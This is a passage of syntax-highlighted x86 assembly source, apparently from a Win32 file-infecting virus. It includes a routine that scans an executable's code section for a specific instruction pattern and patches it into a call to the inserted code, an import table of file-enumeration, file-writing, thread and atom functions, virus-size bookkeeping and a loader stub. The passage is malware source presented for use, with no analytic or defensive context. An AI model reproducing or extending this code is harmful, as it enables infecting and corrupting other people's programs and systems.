                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; EAX=&amp;objtable[0]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.oe_phys_offs</span><span class="sc0">  </span><span class="sc1">; EBX=1st sect offs</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.pusha_edi</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.oe_virt_rva</span><span class="sc0">   </span><span class="sc1">; EAX=curr.RVA</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.oe_phys_size</span><span class="sc0">  </span><span class="sc1">; ECX=1st sect size</span><span class="sc0">

</span><span class="sc5">@@cycle</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">; MOV EAX, FS:[00000000h] &lt;-- useless stuff ;-)</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0A164h</span><span class="sc0">     </span><span class="sc1">; 64 A1</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@not</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; 0 0 0 0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@not</span><span class="sc0">

                        </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">

</span><span class="sc5">@@not</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@cycle</span><span class="sc0">

                        </span><span class="sc1">; even if we replaced nothing</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">imp_name</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ReadFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GlobalAlloc'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GlobalFree'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateThread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindAtomA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AddAtomA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetTickCount'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">kmebin.inc</span><span class="sc0">

                        </span><span class="sc9">align</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">virsize</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc0">

</span><span class="sc5">imp_addr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">x_FindFirstFileA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">x_FindNextFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">x_FindClose</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc5">x_CreateFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">x_SetFilePointer</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">x_ReadFile</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">x_WriteFile</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">x_CloseHandle</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc5">x_GlobalAlloc</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">x_GlobalFree</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc5">x_CreateThread</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc5">x_FindAtomA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">x_AddAtomA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc5">x_GetTickCount</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">

</span><span class="sc5">tempbufptr</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

                        </span><span class="sc9">align</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">virmemory</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

                        </span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">loader</span><span class="sc4">:</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">virentry</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">60</span><span class="sc4">*</span><span class="sc2">1000</span><span class="sc0">
                        </span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">Sleep</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Sleep</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

                        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">loader</span></div></body>
</html>
